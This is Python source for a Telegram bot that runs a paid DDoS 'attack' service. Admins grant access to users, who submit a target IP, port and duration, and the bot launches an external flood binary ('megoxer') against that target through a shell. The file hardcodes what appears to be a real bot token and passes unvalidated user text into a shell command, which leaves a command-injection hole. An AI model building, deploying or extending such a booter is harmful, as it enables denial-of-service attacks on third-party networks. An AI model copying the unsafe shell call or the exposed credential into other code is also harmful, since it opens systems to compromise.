import os
import time
import telebot
import datetime
import subprocess
import threading
from telebot import types

# Insert your Telegram bot token here
bot = telebot.TeleBot('7556718869:AAHHsx0Ws1dbr6GR_9p7Bv65NoC6o5jvpPA')

# Admin user IDs
admin_id = {"7469108296"}

# Files for data storage
LOG_FILE = "log.txt"
USERS_FILE = "users.txt" 

# set attack cooldown per user
COOLDOWN_PERIOD = 300

# In-memory storage
users = {}
last_attack_time = {}
allowed_users = set()

def load_allowed_users():
    """Load allowed users from a text file."""
    global allowed_users
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, "r") as file:
            allowed_users = set(file.read().splitlines())  # Read each line as a user ID
    else:
        allowed_users = set()

def save_allowed_users():
    """Save allowed users to a text file."""
    with open(USERS_FILE, "w") as file:
        for user in allowed_users:
            file.write(f"{user}\n")  # Write each user ID on a new line
        
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                return "No data found."
            else:
                file.truncate(0)
                return "Logs cleared ✅"
    except FileNotFoundError:
        return "No data found."
        
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

load_allowed_users()

@bot.message_handler(commands=['add'])
def add_user(message):
    """Admin command to add a user to the allowed list."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            # Parse the user ID to be added from the command
            parts = message.text.split()
            if len(parts) == 2:
                user_to_add = parts[1]
                allowed_users.add(user_to_add)
                save_allowed_users()
                response = f"✅ 𝗨𝘀𝗲𝗿 {user_to_add} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗮𝗱𝗱𝗲𝗱 𝘁𝗼 𝘁𝗵𝗲 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝗹𝗶𝘀𝘁."
            else:
                response = "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁. 𝗨𝘀𝗲: `/add <user_id>`"
        except Exception as e:
            response = f"❌ 𝗘𝗿𝗿𝗼𝗿: {e}"
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻-𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱."
    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    """Admin command to remove a user from the allowed list."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            # Parse the user ID to be removed from the command
            parts = message.text.split()
            if len(parts) == 2:
                user_to_remove = parts[1]
                if user_to_remove in allowed_users:
                    allowed_users.remove(user_to_remove)
                    save_allowed_users()
                    response = f"✅ 𝗨𝘀𝗲𝗿 {user_to_remove} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝗳𝗿𝗼𝗺 𝘁𝗵𝗲 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝗹𝗶𝘀𝘁."
                else:
                    response = f"❌ 𝗨𝘀𝗲𝗿 {user_to_remove} 𝗶𝘀 𝗻𝗼𝘁 𝗶𝗻 𝘁𝗵𝗲 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝗹𝗶𝘀𝘁."
            else:
                response = "❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁. 𝗨𝘀𝗲: `/remove <user_id>`"
        except Exception as e:
            response = f"❌ 𝗘𝗿𝗿𝗼𝗿: {e}"
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻-𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱."
    bot.reply_to(message, response)

@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def handle_attack(message):
    user_id = str(message.chat.id)
    if user_id in allowed_users:

        # Check if cooldown period has passed
        if user_id in last_attack_time:
            time_since_last_attack = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
            if time_since_last_attack < COOLDOWN_PERIOD:
                remaining_cooldown = COOLDOWN_PERIOD - time_since_last_attack
                response = f"⌛️ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗶𝗻 𝗲𝗳𝗳𝗲𝗰𝘁 𝘄𝗮𝗶𝘁 {int(remaining_cooldown)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
                bot.reply_to(message, response)
                return  # Prevent the attack from proceeding

        # Prompt the user for attack details
        response = "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲"
        bot.reply_to(message, response)
        bot.register_next_step_handler(message, process_attack_details)

    else:
        response = "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔️\n\nOops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your experience!\n\nLet's get you the access you need!"
        bot.reply_to(message, response)

def process_attack_details(message):
    user_id = str(message.chat.id)
    details = message.text.split()

    if len(details) == 3:
        target = details[0]
        try:
            port = int(details[1])
            time = int(details[2])
            if time > 240:
                response = "❗️𝗘𝗿𝗿𝗼𝗿: 𝘂𝘀𝗲 𝗹𝗲𝘀𝘀𝘁𝗵𝗲𝗻 240 𝘀𝗲𝗰𝗼𝗻𝗱𝘀❗️"
            else:
                # Record and log the attack
                record_command_logs(user_id, 'attack', target, port, time)
                log_command(user_id, target, port, time)
                full_command = f"./megoxer {target} {port} {time} 30"
                username = message.chat.username or "No username"
                # Send immediate response that the attack is being executed
                response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗧𝗶𝗺𝗲: {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}"

                # Run attack asynchronously (this won't block the bot)
                subprocess.Popen(full_command, shell=True)
                
                # After attack time finishes, notify user
                threading.Timer(time, send_attack_finished_message, [message.chat.id, target, port, time]).start()

                # Update the last attack time for the user
                last_attack_time[user_id] = datetime.datetime.now()

        except ValueError:
            response = "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 𝗼𝗿 𝘁𝗶𝗺𝗲 𝗳𝗼𝗿𝗺𝗮𝘁."
    else:
        response = "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁"
        
    bot.reply_to(message, response)

def send_attack_finished_message(chat_id, target, port, time):
    """Notify the user that the attack is finished."""
    message = f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱! ✅"
    bot.send_message(chat_id, message)  

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found"
                bot.reply_to(message, response)
        else:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
        bot.reply_to(message, response)

@bot.message_handler(commands=['start'])
def start_command(message):
    """Start command to display the main menu."""
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    attack_button = types.KeyboardButton("🚀 Attack")
    myinfo_button = types.KeyboardButton("👤 My Info")
    markup.add(attack_button, myinfo_button)
    bot.reply_to(message, "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗺𝗲𝗴𝗼𝘅𝗲𝗿 𝗯𝗼𝘁!", reply_markup=markup)
    
@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"
    role = "Admin" if user_id in admin_id else "User"
    status = "Active ✅" if user_id in allowed_users else "Inactive ❌"

    # Format the response
    response = (
        f"👤 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 👤\n\n"
        f"🔖 𝗥𝗼𝗹𝗲: {role}\n"
        f"ℹ️ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n"
        f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: {user_id}\n"
        f"📊 𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n"
    )

    bot.reply_to(message, response)
    
@bot.message_handler(commands=['users'])
def show_authorized_users(message):
    """Admin command to show all authorized users with their usernames."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if allowed_users:
            response = "👥 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗨𝗦𝗘𝗥𝗦 👥\n\n"
            for user in allowed_users:
                try:
                    user_info = bot.get_chat(user)
                    username = f"@{user_info.username}" if user_info.username else "No username"
                    response += f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: {user}\n  𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: {username}\n\n"
                except Exception as e:
                    # In case we fail to get chat details
                    response += f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: {user}\n  𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: 𝗘𝗿𝗿𝗼𝗿 ({e})\n\n"
        else:
            response = "❌ 𝗧𝗵𝗲𝗿𝗲 𝗮𝗿𝗲 𝗻𝗼 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘂𝘀𝗲𝗿𝘀."
    else:
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻-𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱."
    bot.reply_to(message, response)
    
if __name__ == "__main__":
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)
            # Add a small delay to avoid rapid looping in case of persistent errors
        time.sleep(3)